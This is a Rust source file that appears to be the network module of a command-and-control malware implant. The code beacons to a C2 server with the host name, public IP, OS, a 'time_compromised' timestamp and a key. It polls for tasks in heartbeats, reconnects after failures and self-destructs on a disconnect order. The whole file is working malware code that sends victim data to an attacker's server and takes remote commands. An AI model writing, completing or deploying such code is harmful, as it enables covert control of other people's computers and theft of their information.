use gethostname::gethostname;
use local_ip_address::local_ip;
use public_ip;
use reqwest::Client;
use std::time::Duration;

use crate::communication::message::{AgentMessage, ServerMessage};
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;

pub async fn initial_beacon(
    url: &str,
    retries: u64,
    timeout: u64,
    logger: &Logger,
    key: &Vec<u8>,
) -> (u64, String) {
    let beacon = match get_info(key).await {
        Ok(beacon) => beacon,
        Err(e) => {
            logger.error(&format!("[-] Failed to get host info: {:?}", e));
            return (0, "NONE".to_string());
        }
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .build()
        .unwrap();

    for attempt in 1..=retries {
        println!(
            "[*] Attempting HTTP beacon (attempt {}/{})",
            attempt, retries
        );

        let res = client
            .post(url)
            .json(&beacon) // Assumes `beacon` is serializable with Serde
            .send()
            .await;

        match res {
            Ok(resp) => {
                if resp.status().is_success() {
                    match resp.json::<ServerMessage>().await {
                        Ok(ServerMessage::Ack {
                            agent_id,
                            status,
                            session_id,
                        }) => {
                            logger.log(&format!(
                                "[*] Received Ack from server (status: {})",
                                status
                            ));
                            return (agent_id, session_id);
                        }
                        Ok(msg) => {
                            logger.error(&format!("[!] Unexpected message: {:?}", msg));
                            return (0, "NONE".to_string());
                        }
                        Err(e) => {
                            logger.error(&format!("[!] Failed to parse server response: {}", e));
                        }
                    }
                } else {
                    logger.error(&format!(
                        "[!] Server responded with status: {}",
                        resp.status()
                    ));
                }
            }
            Err(e) => {
                logger.error(&format!("[!] Beacon attempt failed: {}", e));
            }
        }
    }

    logger.log(&format!(
        "[!] No Ack received after {} attempts. Operating offline.",
        retries
    ));
    (0, "NONE".to_string())
}

pub async fn heartbeat(
    url: &str, 
    agent_id: u64, 
    session_id: &str, 
    timeout: u64, 
    result: Option<Vec<String>>,
    logger: &Logger
) -> Option<Vec<AgentCommand>> {
    let heartbeat = AgentMessage::Heartbeat { 
        agent_id, 
        session_id: session_id.to_string(), 
        result 
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .build()
        .unwrap();

    let res = client
        .post(url)
        .json(&heartbeat)
        .send()
        .await;

    match res {
        Ok(resp) => {
            if resp.status().is_success() {
                match resp.json::<ServerMessage>().await {
                    Ok(ServerMessage::Task { 
                        agent_id, 
                        session_id, 
                        command 
                    }) => {
                        logger.log("[*] Received tasks from C2");
                        return Some(command)
                    }
                    Ok(ServerMessage::Disconnect { 
                        agent_id, 
                        session_id 
                    }) => {
                        logger.log("[*] Received disconnect from C2");
                        return Some(vec![AgentCommand::SelfDestruct])
                    }
                    Ok(msg) => {
                        logger.error(&format!("[!] Unexpected message: {:?}", msg));
                        return Some(vec![AgentCommand::InvalidTask])            
                    }
                    Err(e) => {
                        logger.error(&format!("[!] Beacon attempt failed: {}", e));
                    }
                }
            } else if resp.status().as_u16() == 204 {
                logger.log("[*] Received NOOP from C2");
                return Some(vec![AgentCommand::NOOP])
            } else {
                logger.error(&format!(
                    "[!] Server responded with status: {}",
                    resp.status()
                ));
            }
        }
        Err(e) => {
            logger.error(&format!("[!] Beacon attempt failed: {}", e));
        }
    }
    return None

}

pub async fn reconnect(
    url: &str,
    agent_id: u64,
    session_id: &str,
    timeout: u64,
    logger: &Logger,
) -> (u64, String) {
    let reconnect = AgentMessage::Reconnect {
        agent_id,
        session_id: session_id.to_string(),
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .build()
        .unwrap();

    let res = client.post(url).json(&reconnect).send().await;

    match res {
        Ok(resp) => {
            if resp.status().is_success() {
                match resp.json::<ServerMessage>().await {
                    Ok(ServerMessage::Ack {
                        agent_id,
                        session_id,
                        status,
                    }) => {
                        logger.log(&format!(
                            "[*] Received Ack from server (status: {})",
                            status
                        ));
                        return (agent_id, session_id);
                    }
                    Ok(msg) => {
                        logger.error(&format!("[!] Unexpected message: {:?}", msg));
                        return (0, "NONE".to_string());
                    }
                    Err(e) => {
                        logger.error(&format!("[!] Failed to parse server response: {}", e));
                    }
                }
            } else {
                logger.error(&format!(
                    "[!] Server responded with status: {}",
                    resp.status()
                ));
            }
        }

        Err(e) => {
            logger.error(&format!("[!] Beacon attempt failed: {}", e));
        }
    }

    logger.error("[!] Failed to reconnect. Continuing to operate offline.");
    (0, "NONE".to_string())
}

/// Constructs an `AgentMessage::Beacon` variant containing information about the compromised system,
/// including the hostname, public IP address, operating system, and the current timestamp in RFC 3339 format.
///
/// # Fields
/// - `hostname`: The system's hostname as a `String`.
/// - `ip`: The public IP address of the system.
/// - `os`: The operating system as a `String`.
/// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
pub async fn get_info(key: &Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
    let hostname = gethostname();
    let local_ip = local_ip()?;
    let os = std::env::consts::OS;

    let public_ip = if let Some(ip) = public_ip::addr().await {
        ip.to_string()
    } else {
        local_ip.to_string()
    };

    let message = AgentMessage::Beacon {
        hostname: hostname.to_string_lossy().to_string(),
        ip: public_ip,
        os: os.to_string(),
        time_compromised: chrono::Utc::now().to_rfc3339(),
        key: key.to_vec(),
    };

    Ok(message)
}
